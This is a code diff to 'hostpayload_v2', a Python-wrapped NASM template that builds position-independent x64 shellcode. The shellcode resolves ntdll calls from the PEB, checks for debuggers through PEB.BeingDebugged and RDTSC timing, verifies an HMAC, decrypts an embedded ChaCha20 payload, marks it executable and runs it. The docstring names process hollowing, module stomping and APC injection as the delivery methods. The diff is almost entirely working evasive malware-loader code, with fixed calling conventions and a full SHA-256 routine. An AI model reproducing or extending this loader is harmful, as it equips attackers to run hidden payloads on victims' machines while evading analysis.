@@ -2,10 +2,10 @@
 """
 hostpayload_v2 self-decrypting shellcode generator.
 
-Builds a position-independent x64 shellcode blob that decrypts a ChaCha20 +
-HMAC-SHA256 payload in place and executes it. The resulting shellcode can be
-injected directly (no EXE on disk) via process hollowing, module stomp, APC,
-thread pool, or any other shellcode loader.
+Builds a position-independent x64 shellcode blob that verifies an HMAC-SHA256
+tag, decrypts a ChaCha20 payload in place, and executes it. The resulting
+shellcode can be injected directly (no EXE on disk) via process hollowing,
+module stomp, APC, thread pool, or any other shellcode loader.
 
 The shellcode is emitted as a Python bytes literal or raw .bin file. It is
 assembled with the system `nasm` so it is completely self-contained and uses no
@@ -46,10 +46,26 @@ start:
     push    r14
     push    r15
 
+    ; establish 16-byte aligned frame with shadow/local space
+    sub     rsp, 0x40
+
     ; find current RIP
     call    .get_rip
 .get_rip:
     pop     r14                     ; r14 = base of shellcode
+
+    ; anti-analysis: PEB.BeingDebugged
+    mov     rax, [gs:0x60]          ; PEB
+    cmp     byte [rax + 0x02], 0
+    jne     .done
+
+    ; anti-analysis: RDTSC timing check (single-step / hypervisor noise)
+    rdtsc
+    mov     ebx, eax
+    rdtsc
+    sub     eax, ebx
+    cmp     eax, 0x4000
+    ja      .done
 
     ; Locate ntdll.dll base from PEB.InLoadOrderModuleList (second entry)
     mov     rax, [gs:0x60]          ; PEB
@@ -68,51 +84,64 @@ start:
     call    resolve_nt
     mov     r13, rax                  ; NtProtectVirtualMemory
 
-    ; allocate RW buffer for decrypted payload
-    sub     rsp, 0x30
-    lea     rdi, [rsp + 0x28]       ; &base
-    mov     qword [rdi], 0
+    ; allocate RW scratch buffer (payload + room for HMAC message construction)
+    mov     r9, __PAYLOAD_SIZE__
+    add     r9, 512
+    lea     rdx, [rsp + 0x38]       ; &base
+    mov     qword [rdx], 0
     mov     rcx, -1                 ; NtCurrentProcess()
-    mov     rdx, rdi                ; base pointer
-    mov     r8, 0                   ; zero bits
-    mov     r9, __PAYLOAD_SIZE__    ; size
-    push    PAGE_READWRITE          ; protect
-    mov     [rsp - 8], r9           ; size on stack for shadow space trick (not used)
-    sub     rsp, 0x28
-    mov     rax, r12
-    call    rax                     ; NtAllocateVirtualMemory
-    add     rsp, 0x28
+    xor     r8, r8                  ; zero bits
+    sub     rsp, 0x40               ; shadow space + 2 stack args, 16-byte aligned
+    mov     qword [rsp + 0x28], MEM_COMMIT | MEM_RESERVE
+    mov     qword [rsp + 0x30], PAGE_READWRITE
+    call    r12                     ; NtAllocateVirtualMemory
+    mov     r15, [rsp + 0x38]       ; allocated base
+    add     rsp, 0x40
     test    rax, rax
     js      .done
-    mov     rdi, [rsp + 0x28]       ; allocated base
+
+    ; verify HMAC-SHA256 tag before decrypting/executing
+    lea     rdi, [r14 + payload_key]
+    lea     rsi, [r14 + payload_cipher]
+    mov     edx, __PAYLOAD_SIZE__
+    lea     rcx, [rsp + 0x10]       ; computed MAC on stack
+    mov     r8, r15                 ; scratch buffer
+    call    hmac_sha256
+    lea     rsi, [r14 + payload_hmac]
+    lea     rdi, [rsp + 0x10]
+    mov     ecx, 32
+    repe    cmpsb
+    jne     .done
 
     ; ChaCha20 decrypt embedded ciphertext into allocated buffer
     lea     rsi, [r14 + payload_nonce]
     lea     rdx, [r14 + payload_cipher]
     mov     rcx, __PAYLOAD_SIZE__
+    mov     rdi, r15
     lea     r8, [r14 + payload_key]
     call    chacha20_decrypt
 
-    ; protect to RX
-    sub     rsp, 0x28
-    lea     rax, [rsp + 0x28]       ; &base
-    mov     [rax], rdi
-    mov     rcx, -1
-    mov     rdx, rax
-    mov     r8, 0
+    ; protect decrypted payload to RX
     mov     r9, __PAYLOAD_SIZE__
-    push    PAGE_EXECUTE_READ
-    mov     rax, r13
-    call    rax                     ; NtProtectVirtualMemory
-    add     rsp, 0x30
+    sub     rsp, 0x50
+    lea     rdx, [rsp + 0x40]       ; &base
+    mov     [rdx], r15
+    lea     r8, [rsp + 0x48]        ; &size
+    mov     [r8], r9
+    lea     rax, [rsp + 0x30]       ; &old protect
+    mov     qword [rsp + 0x28], rax
+    mov     rcx, -1
+    mov     r9, PAGE_EXECUTE_READ
+    call    r13                     ; NtProtectVirtualMemory
+    add     rsp, 0x50
     test    rax, rax
     js      .done
 
     ; execute decrypted payload
-    call    rdi
+    call    r15
 
 .done:
-    add     rsp, 0x30
+    add     rsp, 0x40
     pop     r15
     pop     r14
     pop     r13
@@ -192,7 +221,8 @@ chacha20_decrypt:
     mov     r13, rcx                ; remaining length
     mov     r12, rsi                ; nonce
     mov     rbp, r8                 ; key
-    xor     ebx, ebx                ; block counter
+    xor     ebx, ebx                ; block counter (starts at 1 below)
+    inc     ebx                     ; IETF ChaCha20 counter starts at 1
 
 .block_loop:
     test    r13, r13
@@ -303,13 +333,12 @@ chacha20_decrypt:
 
 chacha_block:
     push    rcx
-    ; work = state copy at rsp+64
+    ; work = state copy at rsp+8 (return address) + 64 = rsp+72
     sub     rsp, 64
-    mov     rsi, rsp
-    add     rsi, 64
-    mov     rdi, rsp
+    lea     rsi, [rsp + 72]      ; caller's state buffer
+    mov     rdi, rsp             ; local work buffer
     mov     ecx, 16
-    rep movsd
+    rep     movsd
 
     mov     ecx, 10
 .rounds:
@@ -332,25 +361,424 @@ chacha_block:
     mov     ecx, 16
 .add_loop:
     dec     ecx
-    mov     eax, [rsp + 64 + rcx*4]
+    mov     eax, [rsp + 72 + rcx*4]
     add     [rsp + rcx*4], eax
     test    ecx, ecx
     jnz     .add_loop
 
-    ; copy result to caller's work buffer
-    mov     rsi, rsp
-    mov     rdi, rsp
-    add     rdi, 64
+    ; copy result back to caller's state buffer
+    mov     rsi, rsp             ; local work buffer
+    lea     rdi, [rsp + 72]      ; caller's state buffer
     mov     ecx, 16
-    rep movsd
+    rep     movsd
     add     rsp, 64
     pop     rcx
+    ret
+
+; -----------------------------------------------------------------------------
+; SHA-256 implementation
+; -----------------------------------------------------------------------------
+; SHA-256 helper macros
+%macro SHA_SIG0 2                 ; Sigma0(x) -> %1 (32-bit reg)
+    mov     eax, %2
+    ror     eax, 2
+    mov     %1, eax
+    mov     eax, %2
+    ror     eax, 13
+    xor     %1, eax
+    mov     eax, %2
+    ror     eax, 22
+    xor     %1, eax
+%endmacro
+
+%macro SHA_SIG1 2                 ; Sigma1(x) -> %1
+    mov     eax, %2
+    ror     eax, 6
+    mov     %1, eax
+    mov     eax, %2
+    ror     eax, 11
+    xor     %1, eax
+    mov     eax, %2
+    ror     eax, 25
+    xor     %1, eax
+%endmacro
+
+%macro SHA_CH 4                   ; Ch(x,y,z) -> eax; clobbers ecx
+    mov     eax, %1
+    and     eax, %2
+    mov     ecx, %1
+    not     ecx
+    and     ecx, %3
+    xor     eax, ecx
+%endmacro
+
+%macro SHA_MAJ 4                  ; Maj(x,y,z) -> eax; clobbers ecx
+    mov     eax, %1
+    and     eax, %2
+    mov     ecx, %1
+    and     ecx, %3
+    or      eax, ecx
+    mov     ecx, %2
+    and     ecx, %3
+    or      eax, ecx
+%endmacro
+
+; in: eax = word; out: eax = sigma0(word)
+sha_sigma0:
+    mov     ecx, eax
+    ror     eax, 7
+    ror     ecx, 18
+    xor     eax, ecx
+    shr     ecx, 3
+    xor     eax, ecx
+    ret
+
+; in: eax = word; out: eax = sigma1(word)
+sha_sigma1:
+    mov     ecx, eax
+    ror     eax, 17
+    ror     ecx, 19
+    xor     eax, ecx
+    shr     ecx, 10
+    xor     eax, ecx
+    ret
+
+; SHA-256 core transform
+; Stack layout:
+;   rsp+0x000..0x0ff : W[64]
+;   rsp+0x100..0x11f : H[8]
+;   rsp+0x120..0x13f : a-h temp
+;   rsp+0x140..0x147 : round counter t
+;   rsp+0x150..0x18f : block buffer
+;   rsp+0x190..0x197 : bit length
+; in: rdi -> next 64-byte message block; advances rdi
+sha_transform:
+    push    rbx
+    push    rbp
+    push    rsi
+    push    r12
+    push    r13
+    push    r14
+    push    r15
+    sub     rsp, 0x1a0
+
+    ; copy block into W[0..15]
+    mov     rsi, rdi
+    lea     rdi, [rsp + 0x000]
+    mov     ecx, 16
+    rep     movsd
+
+    ; extend W[16..63]
+    mov     ecx, 16
+.extend:
+    cmp     ecx, 64
+    jae     .extend_done
+    mov     eax, [rsp + (rcx - 2)*4]
+    call    sha_sigma1
+    mov     ebx, eax
+    mov     eax, [rsp + (rcx - 7)*4]
+    add     ebx, eax
+    mov     eax, [rsp + (rcx - 15)*4]
+    call    sha_sigma0
+    add     ebx, eax
+    mov     eax, [rsp + (rcx - 16)*4]
+    add     eax, ebx
+    mov     [rsp + rcx*4], eax
+    inc     ecx
+    jmp     .extend
+.extend_done:
+
+    ; load a-h from H
+    mov     r8d, [rsp + 0x100]   ; a
+    mov     r9d, [rsp + 0x104]   ; b
+    mov     r10d, [rsp + 0x108]  ; c
+    mov     r11d, [rsp + 0x10c]  ; d
+    mov     r12d, [rsp + 0x110]  ; e
+    mov     r13d, [rsp + 0x114]  ; f
+    mov     r14d, [rsp + 0x118]  ; g
+    mov     r15d, [rsp + 0x11c]  ; h
+
+    ; 64 rounds
+    mov     dword [rsp + 0x140], 0
+.round:
+    mov     ecx, [rsp + 0x140]
+    cmp     ecx, 64
+    jae     .rounds_done
+
+    SHA_SIG1 ebx, r12d            ; ebx = Sigma1(e)
+    add     ebx, r15d             ; +h
+    SHA_CH   eax, r12d, r13d, r14d ; eax = Ch(e,f,g)
+    add     ebx, eax              ; +Ch
+    mov     eax, [sha256_k + ecx*4]
+    add     ebx, eax              ; +K[t]
+    mov     eax, [rsp + rcx*4]
+    add     ebx, eax              ; +W[t]  -> ebx = T1
+
+    SHA_SIG0 eax, r8d             ; eax = Sigma0(a)
+    mov     ebp, eax
+    SHA_MAJ  eax, r8d, r9d, r10d  ; eax = Maj(a,b,c)
+    add     ebp, eax              ; ebp = T2
+
+    ; shift registers
+    mov     r15d, r14d            ; h = g
+    mov     r14d, r13d            ; g = f
+    mov     r13d, r12d            ; f = e
+    mov     r12d, r11d            ; e = d
+    add     r12d, ebx             ; e = d + T1
+    mov     r11d, r10d            ; d = c
+    mov     r10d, r9d             ; c = b
+    mov     r9d, r8d              ; b = a
+    mov     r8d, ebx              ; a = T1
+    add     r8d, ebp              ; a += T2
+
+    inc     dword [rsp + 0x140]
+    jmp     .round
+.rounds_done:
+
+    ; add to H
+    add     [rsp + 0x100], r8d
+    add     [rsp + 0x104], r9d
+    add     [rsp + 0x108], r10d
+    add     [rsp + 0x10c], r11d
+    add     [rsp + 0x110], r12d
+    add     [rsp + 0x114], r13d
+    add     [rsp + 0x118], r14d
+    add     [rsp + 0x11c], r15d
+
+    add     rsp, 0x1a0
+    pop     r15
+    pop     r14
+    pop     r13
+    pop     r12
+    pop     rsi
+    pop     rbp
+    pop     rbx
+    ret
+
+; SHA-256 single-shot hash
+; in: rdi = message, esi = length (bytes), rdx = output digest pointer
+sha256:
+    push    rbx
+    push    rbp
+    push    rsi
+    push    rdi
+    push    r12
+    push    r13
+    push    r14
+    push    r15
+    sub     rsp, 0x1a0
+
+    ; save args
+    mov     r12, rdi              ; r12 = msg
+    mov     r13d, esi             ; r13 = len
+    mov     r14, rdx              ; r14 = out
+
+    ; init H
+    mov     eax, [sha256_h + 0]
+    mov     [rsp + 0x100], eax
+    mov     eax, [sha256_h + 4]
+    mov     [rsp + 0x104], eax
+    mov     eax, [sha256_h + 8]
+    mov     [rsp + 0x108], eax
+    mov     eax, [sha256_h + 12]
+    mov     [rsp + 0x10c], eax
+    mov     eax, [sha256_h + 16]
+    mov     [rsp + 0x110], eax
+    mov     eax, [sha256_h + 20]
+    mov     [rsp + 0x114], eax
+    mov     eax, [sha256_h + 24]
+    mov     [rsp + 0x118], eax
+    mov     eax, [sha256_h + 28]
+    mov     [rsp + 0x11c], eax
+
+    ; process full blocks
+    mov     edi, r13d
+    shr     edi, 6
+    jz      .final_init
+    mov     [rsp + 0x140], edi
+.full_loop:
+    mov     rdi, r12
+    call    sha_transform
+    add     r12, 64
+    dec     dword [rsp + 0x140]
+    jnz     .full_loop
+
+.final_init:
+    ; zero the 64-byte final block buffer before use
+    lea     rdi, [rsp + 0x150]
+    mov     ecx, 16
+    xor     eax, eax
+    rep     stosd
+
+    ; copy remaining bytes to block buffer
+    mov     eax, r13d
+    and     eax, 63
+    jz      .no_tail
+    mov     ecx, eax
+    mov     rsi, r12
+    lea     rdi, [rsp + 0x150]
+    rep     movsb
+.no_tail:
+    ; append 0x80
+    mov     eax, r13d
+    and     eax, 63
+    lea     rdi, [rsp + 0x150]
+    mov     byte [rdi + rax], 0x80
+
+    ; compute bit length (big-endian 64 bits)
+    mov     rax, r13
+    shl     rax, 3
+    bswap   rax
+    mov     [rsp + 0x190], rax
+
+    ; decide one or two final blocks
+    mov     eax, r13d
+    and     eax, 63
+    cmp     eax, 56
+    jb      .final_one
+
+    ; process first final block (with padding, no length yet)
+    lea     rdi, [rsp + 0x150]
+    call    sha_transform
+    ; zero block buffer for length-only block
+    lea     rdi, [rsp + 0x150]
+    mov     ecx, 16
+    xor     eax, eax
+    rep     stosd
+
+.final_one:
+    ; append bit length at end of block buffer
+    mov     rax, [rsp + 0x190]
+    mov     [rsp + 0x150 + 56], rax
+    lea     rdi, [rsp + 0x150]
+    call    sha_transform
+
+    ; write digest big-endian
+    lea     rsi, [rsp + 0x100]
+    mov     rdi, r14
+    mov     ecx, 8
+.copy_digest:
+    mov     eax, [rsi]
+    bswap   eax
+    mov     [rdi], eax
+    add     rsi, 4
+    add     rdi, 4
+    loop    .copy_digest
+
+    add     rsp, 0x1a0
+    pop     r15
+    pop     r14
+    pop     r13
+    pop     r12
+    pop     rdi
+    pop     rsi
+    pop     rbp
+    pop     rbx
+    ret
+
+; -----------------------------------------------------------------------------
+; HMAC-SHA256
+; in: rdi = key (32 bytes), rsi = message, edx = message length, rcx = out (32)
+;       r8 = scratch buffer (must hold 64 + msg_len bytes)
+; -----------------------------------------------------------------------------
+hmac_sha256:
+    push    rbx
+    push    rbp
+    push    rsi
+    push    rdi
+    push    r12
+    push    r13
+    push    r14
+    push    r15
+    sub     rsp, 0x40               ; local state + alignment
+
+    mov     r12, rdi                ; key
+    mov     r13, rsi                ; msg
+    mov     r14d, edx               ; msg len
+    mov     r15, rcx                ; out
+    mov     rbp, r8                 ; scratch
+
+    ; build inner pad: key ^ 0x36 then 0x36 * 32
+    mov     ecx, 32
+    mov     rsi, r12
+    mov     rdi, rbp
+.inner_xor:
+    lodsb
+    xor     al, 0x36
+    stosb
+    loop    .inner_xor
+    mov     ecx, 32
+    mov     al, 0x36
+    rep     stosb
+
+    ; append message
+    mov     ecx, r14d
+    mov     rsi, r13
+    rep     movsb
+
+    ; inner hash
+    mov     rdi, rbp
+    mov     esi, r14d
+    add     esi, 64
+    lea     rdx, [rsp + 0x10]       ; inner hash local
+    call    sha256
+
+    ; build outer pad: key ^ 0x5c then 0x5c * 32
+    mov     ecx, 32
+    mov     rsi, r12
+    mov     rdi, rbp
+.outer_xor:
+    lodsb
+    xor     al, 0x5c
+    stosb
+    loop    .outer_xor
+    mov     ecx, 32
+    mov     al, 0x5c
+    rep     stosb
+
+    ; append inner hash
+    mov     rsi, rsp
+    add     rsi, 0x10
+    mov     ecx, 32
+    rep     movsb
+
+    ; final hash
+    mov     rdi, rbp
+    mov     esi, 96
+    mov     rdx, r15
+    call    sha256
+
+    add     rsp, 0x40
+    pop     r15
+    pop     r14
+    pop     r13
+    pop     r12
+    pop     rdi
+    pop     rsi
+    pop     rbp
+    pop     rbx
     ret
 
 payload_key:    db __KEY_BYTES__
 payload_nonce:  db __NONCE_BYTES__
 payload_cipher: db __PAYLOAD_BYTES__
 payload_hmac:   db __HMAC_BYTES__
+
+align 4
+sha256_h:
+    dd 0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a
+    dd 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
+
+align 4
+sha256_k:
+    dd 0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5
+    dd 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174
+    dd 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da
+    dd 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967
+    dd 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85
+    dd 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070
+    dd 0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3
+    dd 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
 """
 
 
